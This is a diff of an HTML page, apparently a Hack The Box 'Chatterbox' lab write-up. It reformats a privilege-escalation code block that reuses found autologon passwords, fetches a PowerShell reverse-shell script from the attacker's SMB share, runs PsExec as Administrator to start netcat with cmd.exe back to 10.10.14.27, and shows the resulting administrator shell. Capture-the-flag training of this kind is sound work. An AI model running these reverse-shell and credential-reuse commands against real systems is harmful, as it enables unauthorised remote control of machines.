@@ -195,10 +195,24 @@ chatterbox\alfred
     DefaultUserName               :  Alfred
     DefaultPassword               :  Welcome1
 </code></pre></div></div>
-<p>```
-C:\Users\Alfred&gt; net use \CHATTERBOX /user:CHATTERBOX\Administrator Welcome1!
-C:\Users\Alfred&gt; copy \10.10.14.27\kali\power-reverse.ps1 .
-C:\Users\Alfred&gt; powershell -exec bypass “. .\power-reverse.ps1; Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.27 -Port 4488”</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\Alfred&gt; net use \\CHATTERBOX /user:CHATTERBOX\Administrator Welcome1!
+C:\Users\Alfred&gt; copy \\10.10.14.27\kali\power-reverse.ps1 .
+C:\Users\Alfred&gt; powershell -exec bypass ". .\power-reverse.ps1; Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.27 -Port 4488"
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\Alfred&gt; copy \\10.10.14.27\kali\PsExec.exe psexec.exe
+PS C:\Users\Alfred&gt; .\psexec.exe -accepteula -u CHATTERBOX\Administrator -p Welcome1! -i C:\Users\Alfred\nc.exe -nv 10.10.14.27 4891 -e cmd.exe
+
+┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/chatterbox]
+└─$ nc -nlvp 4891                                                            
+listening on [any] 4891 ...
+connect to [10.10.14.27] from (UNKNOWN) [10.129.25.108] 49170
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+chatterbox\administrator
+</code></pre></div></div>
 
       <div class="page-footer">
         <div class="page-share">
